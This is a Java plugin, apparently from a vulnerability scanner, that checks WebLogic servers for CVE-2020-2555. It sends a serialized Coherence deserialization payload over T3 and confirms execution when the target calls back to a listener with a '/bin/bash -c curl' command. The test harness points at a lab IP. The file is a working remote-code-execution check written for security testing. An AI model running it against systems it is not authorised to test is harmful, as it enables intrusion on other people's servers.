package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.Host;
import com.gbw.scanner.plugins.scripts.weblogic.*;
import com.xmap.api.utils.TextUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.file.Files;
import java.nio.file.Paths;

public class GBWCVE_2020_2555_NOECHO extends GBWAbstractNoEchoVul{

    private static final Logger log = LoggerFactory.getLogger(GBWCVE_2020_2555_NOECHO.class);

    public GBWCVE_2020_2555_NOECHO(GBWScanWeblogicConfig config) {
        super(config, "CVE_2020_2555", "CVE_2020_2555");
    }

    @Override
    public String getDefaultProto() {
        return "t3";
    }

    private String findVersion(String version){

        String nversion = version.replace(".","");

        for(String pversion:config.getVersions()){

            if(nversion.contains(pversion)){
                return pversion;
            }
        }

        return config.getDefaultVersion();
    }

    @Override
    public GBWVulCheckResult scan(Host host){

        try {


            String version = GBWWeblogicVersion.getVersion(config, host);

            if (TextUtils.isEmpty(version))
                return null;

            String pversion = findVersion(version);
            if (TextUtils.isEmpty(pversion))
                return null;

             

            GBWHttpLogClient httpLogClient = new GBWHttpLogClient(host, config.getHttpLogIP(), config.getHttpLogPort(), "CVE-2020-2555");

            String cmd = httpLogClient.makeRequestCmd(config.getHttpClientCmd());


            //byte[] payload =GBWCoherenceClient.makePayload(config.getCoherenceIP(), config.getCoherencePort(), pversion, cmd);
            byte[] payload = Files.readAllBytes(Paths.get("D:\\shajf_dev\\GBWScanner\\data\\coherence_1036.data"));
            if (payload == null || payload.length == 0)
                return null;

            GBWPayloadSend.sendT3(config, host, payload);
            Thread.sleep(config.getScanSleepTime());

            if(httpLogClient.hasResponse()){

                log.warn(String.format("Found a Weblogic vul in ip:%s,port:%d,cmd:%s,version:%s",host.getIp(),host.getPort(),cmd,version));
                return new GBWVulCheckResult(version,"CVE-2020-2555","CVE-2020-2555-NOECHO",cmd,"","GBWCVE-2020-2555-NOECHO");
            }

        }catch (Exception e){

        }

        return null;
    }

    public static void main(String[] args){

        GBWScanWeblogicConfig config =  new GBWScanWeblogicConfig();

        config.setReadTimeout(10000);
        config.setConTimeout(10000);
        config.setScanSleepTime(6000);
        config.setCmd("id");
        config.setEchoShell("t3IIOP");
        config.setDefaultVersion("12130");
        config.setVersions(new String[]{"1036","12120","12130","12210","12211","12212","12213","12214"});
        config.setCoherenceIP("192.168.198.134");
        config.setCoherencePort(9030);
        config.setHttpLogIP("192.168.198.134");
        config.setHttpLogPort(8080);
        config.setHttpClientCmd("/bin/bash,-c,curl ");

        config.setPayloadScriptDir("D:\\shajf_dev\\GBWScanner\\data");

        GBWCVE_2020_2555_NOECHO scanWeblogicScript = new GBWCVE_2020_2555_NOECHO(config);

        String ip = "192.168.198.134";
        int port = 7001;
        Host host = new Host(ip,ip,port,null,"t3");

        scanWeblogicScript.scan(host);

    }

}
